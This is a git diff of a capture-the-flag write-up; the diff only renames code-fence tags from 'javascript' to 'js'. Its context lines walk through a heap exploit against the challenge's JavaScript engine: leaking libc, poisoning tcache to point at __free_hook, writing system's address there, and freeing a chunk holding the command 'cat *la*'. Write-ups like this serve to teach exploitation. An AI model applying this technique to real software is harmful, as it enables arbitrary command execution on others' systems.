@@ -166,7 +166,7 @@ Eventually, we decided to try the following exploit:
 
 We created a chunk with size 0x1000, freed it and then inspected its contents. We got a libc pointer in the second QWORD of the chunk.
 
-```javascript
+```js
 function hex(a) {
   var result = "";
 
@@ -203,11 +203,11 @@ After a lot of tweaking, we developed working exploit ([pwn.js]({{ "/assets/code
 
 1. Alocate a chunk of size 0x1e0.
 We chose 0x1e0 since the Tcache was already populated, meaning we would not have problems with the chunk counter.
-```javascript
+```js
 chunk = new Uint8Array(0x1e0);
 ```
 2. Free the chunk
-```javascript
+```js
 chunk.midnight();
 ```
 Tcache:
@@ -216,7 +216,7 @@ Tcachebins[idx=29, size=0x1f0] count=2  ←  Chunk(addr=0x4c9a80, size=0x1f0, fl
 ```
 
 3. `chunk->fd = &__free_hook`
-```javascript
+```js
 free_hook = libc_base + 0x1eee48;
 free_hook_str = free_hook.toString(16);
 
@@ -235,7 +235,7 @@ Tcachebins[idx=29, size=0x1f0] count=2  ←  Chunk(addr=0x4c9a70, size=0x1f0, fl
 ```
 
 4. Allocate a chunk and write the command for `system`. `cat *la*` worked for our exploit.
-```javascript
+```js
 chunk2 = new Uint32Array(0x78);
 chunk2[1] = 0x2a616c2a; // *la*
 chunk2[0] = 0x20746163; // cat
@@ -246,14 +246,14 @@ Tcachebins[idx=29, size=0x1f0] count=1  ←  Chunk(addr=0x7ffff7ddfe48, size=0x0
 ```
 
 5. Allocate the final chunk. `malloc` will return `&__free_hook`
-```javascript
+```js
 target = new Uint32Array(0x78);
 target[0] = system;         // lower  32 bits of system
 target[1] = system_upper;   // higher 32 bits of system
 ```
 
 6. Free chunk2 containing `cat *la*`
-```javascript
+```js
 chunk2.midnight()
 ``` 
 
